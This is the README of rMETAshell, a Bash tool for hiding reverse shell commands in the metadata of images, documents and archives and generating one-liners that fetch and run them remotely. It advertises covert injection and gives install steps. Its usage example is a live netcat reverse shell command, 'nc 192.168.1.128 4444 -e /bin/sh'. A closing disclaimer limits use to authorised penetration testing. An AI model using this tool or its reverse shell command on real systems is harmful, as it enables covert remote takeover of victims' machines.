# rMETAshell
[![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-red)](https://github.com/sponsors/git5loxosec) [![Kali Linux Compatible](https://img.shields.io/badge/Kali%20Linux-Compatible-brightgreen)](https://www.kali.org/)
 <img src="https://camo.githubusercontent.com/f25217d6db3b6cb603d9fb4a2b017a682aae3b1ec5c6ffab653f6cd31eceb73c/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446576656c6f7065642532306f6e2d6b616c692532306c696e75782d626c756576696f6c6574"> 
 ![Language](https://img.shields.io/badge/Language-Bash-green.svg)
 ![License](https://img.shields.io/badge/License-MIT-blue.svg) 


Reverse shell metadata injection compatible with jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx and txt!.
<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell1.png">
Clean image file no reverse shell.
<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell2.png">
The reverse shell injection method used here wont affect the integrity of the image file.
<img src="https://github.com/git5loxosec/rMETAshell/blob/main/github_rimgshell3.png">
Connection established, mission accomplished!


# New!:

Supports jpg, jpeg, png, mp4, html, htm, zip, rar, pdf, doc, xls, ppt, docx, pptx, xlsx, txt!

# Description:

rMETAshell is a command-line tool for injecting a reverse shell command into the metadata and generating one-liner execution methods.

# How It Works:
rMETAshell takes a reverse shell command and an image file as input. It then injects the command into the image using metadata comments. After injection, it generates a one-liner execution method for retrieving and executing the injected command from a remote location.

# Features:
Covert Command Injection: Inject reverse shell commands into image files.
Multiple Execution Methods: Choose from various one-liner execution methods for retrieving and executing the injected command.
Versatile Compatibility: Works with common Linux command-line utilities such as exiftool, exiv2, identify, file, and jpeginfo.
Secure Communication: Execute commands remotely without revealing their presence in the image.

## Installation

1. Clone the repository:

   ```
   git clone https://github.com/git5loxosec/rMETAshell
   ```

2. Change to the project directory:

   ```
   cd rMETAshell
   ```

3. Make the script executable:

   ```
   chmod +x rMETAshell.sh
   ```

## Usage

```
./rMETAshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <IMAGE_FILENAME>
```

- `[OPTIONS]` - Optional arguments.
- `<REVERSE_SHELL_COMMAND>` - The reverse shell command to inject.
- `<IMAGE_FILENAME>` - The name of the image file.

**Example:**

```
./rMETAshell.sh "nc 192.168.1.128 4444 -e /bin/sh" image.jpg
```

Note: Ensure that you have the required dependencies (e.g., exiftool, curl) installed on your system before using rMETAshell.

**Warning: Ethical and Responsible Use Only
rMETAshell is intended for legitimate and ethical purposes, such as penetration testing, cybersecurity assessments, and educational use. Unauthorized use of this tool for malicious activities is strictly prohibited and may have serious legal consequences. Ensure that you have proper authorization and adhere to all applicable laws and regulations before using rIMGshell.**


## License


This project is licensed under the [MIT License](LICENSE).
